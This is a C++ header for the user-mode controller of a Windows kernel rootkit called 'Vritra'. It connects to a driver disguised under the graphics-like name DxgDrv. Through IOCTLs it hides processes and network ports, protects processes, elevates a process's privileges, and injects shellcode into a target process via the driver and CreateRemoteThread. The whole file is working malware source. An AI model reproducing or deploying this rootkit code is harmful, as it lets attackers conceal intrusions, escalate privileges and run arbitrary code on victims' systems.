#pragma once
#include <iostream>
#include <Windows.h>

#define IOCTL_HIDEPROC CTL_CODE(FILE_DEVICE_UNKNOWN, 0x78616666a, METHOD_NEITHER, FILE_SPECIAL_ACCESS)
#define IOCTL_HIDEPORT CTL_CODE(FILE_DEVICE_UNKNOWN, 0x78616666b, METHOD_NEITHER, FILE_SPECIAL_ACCESS)
#define IOCTL_PROTPROC CTL_CODE(FILE_DEVICE_UNKNOWN, 0x78616666c, METHOD_NEITHER, FILE_SPECIAL_ACCESS)
#define IOCTL_ELEVPROC CTL_CODE(FILE_DEVICE_UNKNOWN, 0x78616666d, METHOD_NEITHER, FILE_SPECIAL_ACCESS)
#define IOCTL_SHELL    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x78616666e, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define IOCTL_GETBUFF  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x78616666f, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)

// Set to FALSE to disable console output
#define OUTPUT TRUE

namespace Vritra
{
	static HANDLE DriverHandle = nullptr;

	BOOL Connect()
	{
		DriverHandle = CreateFile(L"\\\\.\\DxgDrv", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

		if (DriverHandle == INVALID_HANDLE_VALUE)
		{
#if OUTPUT
			std::cout << "[-] Couldn't open handle to the driver. Error : " << GetLastError() << std::endl;
#endif
			return FALSE;
		}

		return TRUE;
	}

	struct PidData {
		UINT32 Pid;
	};

	struct PortData {
		USHORT Port;
	};

	struct HideProtocol {
		USHORT LTCP;
		USHORT RTCP;
		USHORT UDP;
	};

	struct Shell {
		UINT32 pid;
		unsigned char* shellcode;
		UINT32 size;
	};

	BOOL HideProcess(UINT32 PID)
	{
		PidData data;
		data.Pid = PID;

		DWORD returned;
		BOOL success = DeviceIoControl(DriverHandle, IOCTL_HIDEPROC, &data, sizeof(data), nullptr, 0, &returned, nullptr);

		if (!success)
		{
#if OUTPUT
			std::cout << "[-] Failed to send message to the driver. Error : " << GetLastError() << std::endl;
#endif
			return success;
		}

#if OUTPUT
		std::cout << "[!] Message sent to the driver" << std::endl;
#endif
		return success;
	}

	BOOL ElevateProcess(UINT32 PID)
	{
		PidData data;
		data.Pid = PID;

		DWORD returned;
		BOOL success = DeviceIoControl(DriverHandle, IOCTL_ELEVPROC, &data, sizeof(data), nullptr, 0, &returned, nullptr);

		if (!success)
		{
#if OUTPUT
			std::cout << "[-] Failed to send message to the driver. Error : " << GetLastError() << std::endl;
#endif
			return success;
		}

#if OUTPUT
		std::cout << "[!] Message sent to driver" << std::endl;
#endif
		return success;
	}

	BOOL ProtectProcess(UINT32 PID)
	{
		PidData data;
		data.Pid = PID;

		DWORD returned;
		BOOL success = DeviceIoControl(DriverHandle, IOCTL_PROTPROC, &data, sizeof(data), nullptr, 0, &returned, nullptr);
		if (!success)
		{
#if OUTPUT
			std::cout << "[-] Failed to send message to the driver. Error : " << GetLastError() << std::endl;
#endif
			return success;
		}

#if OUTPUT
		std::cout << "[!] Message sent to the driver" << std::endl;
#endif
		return success;
	}

	BOOL HidePort(HideProtocol hp)
	{
		DWORD returned;
		BOOL success = DeviceIoControl(DriverHandle, IOCTL_HIDEPORT, &hp, sizeof(hp), nullptr, 0, &returned, nullptr);
		if (!success)
		{
#if OUTPUT
			std::cout << "[-] Failed to send message to the driver. Error : " << GetLastError() << std::endl;
#endif
			return success;
		}

#if OUTPUT
		std::cout << "[!] Message sent to the driver" << std::endl;
#endif
		return success;
	}

	BOOL InjectShellcode(unsigned char* shellcode, UINT32 shellcodeSize, UINT32 PID)
	{
		Shell shell;
		shell.shellcode = shellcode;
		shell.size = shellcodeSize;
		shell.pid = PID;

		ULONG retn;
		BOOL success = DeviceIoControl(DriverHandle, IOCTL_SHELL, &shell, sizeof(shell), NULL, 0, &retn, NULL);
		if (!success)
		{
#if OUTPUT
			printf("[-] Could not open device control | Error : %d\n", GetLastError());
#endif
			return success;
		}

		PVOID buffer = { 0 };
		success = DeviceIoControl(DriverHandle, IOCTL_GETBUFF, &buffer, sizeof(buffer), &buffer, sizeof(buffer), &retn, NULL);
		if (!success)
		{
#if OUTPUT
			printf("[-] Could not open device control | Error : %d\n", GetLastError());
#endif
			return success;
		}

#if OUTPUT
		printf("Buffer : 0x%x", buffer);
#endif

		HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
		CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, NULL);

		return success;
	}
}